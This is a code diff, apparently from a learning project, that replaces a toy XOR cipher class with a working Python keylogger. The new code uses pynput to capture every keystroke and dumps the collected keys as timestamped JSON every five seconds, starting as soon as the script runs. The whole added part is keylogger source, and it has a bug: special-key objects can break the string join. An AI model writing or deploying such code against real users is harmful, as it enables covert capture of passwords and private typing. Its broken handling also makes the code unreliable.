@@ -1,19 +1,51 @@
-class EncryptionsInformatio:
+import threading
+from pynput import keyboard
+from datetime import datetime
+import json
+
+class IKeylogger:
     def __init__(self):
-        self.key = int(input("enter your key number"))
+        self.my_list = []
+        self.listener = None
 
-    def encryption(self, data:str):
-        # self.encrypted_data = ""
-        # for x in data:
-        #     num = ord(x) ^ self.key
-        #     ch = str(num)
-        #     self.encrypted_data += ch
-        # return self.encrypted_data
+    def on_press(self, key):
+        try:
+            tempKey = str(key.char)
+        except AttributeError:
+            if key == keyboard.Key.backspace:
+                if self.my_list:
+                    self.my_list.pop()
+                return
+            elif key == keyboard.Key.enter:
+                tempKey = '\n'
+            elif key == keyboard.Key.space:
+                tempKey = ' '
+            else:
+                tempKey = key
+        self.my_list.append(tempKey)
 
-        return "".join((chr(ord(x) ^ self.key) for x in data))
-    #
-    # def decryption(self, data:str):
-    #     return
+    def start_logging(self):
+        self.listener = keyboard.Listener(on_press=self.on_press)
+        self.listener.start()
 
-a1 = EncryptionsInformatio()
-print(a1.encryption(5, "israel yarbloom"))
+
+
+class AddToFile(IKeylogger):
+    def __init__(self):
+        super().__init__()
+        self.timestamps = []
+
+
+# מדפיס את הjson כול 5 שניות
+    def print_json(self):
+        if self.my_list:
+            combined_keys = "".join(self.my_list)
+            self.timestamps.append(datetime.now().strftime("%d/%m/%Y %H:%M:%S"))
+            print(json.dumps({"timestamps": self.timestamps, "keys": combined_keys}))
+        threading.Timer(5, self.print_json).start()
+        self.my_list = []
+        self.timestamps = []
+
+keylogger = AddToFile()
+keylogger.start_logging()
+keylogger.print_json()
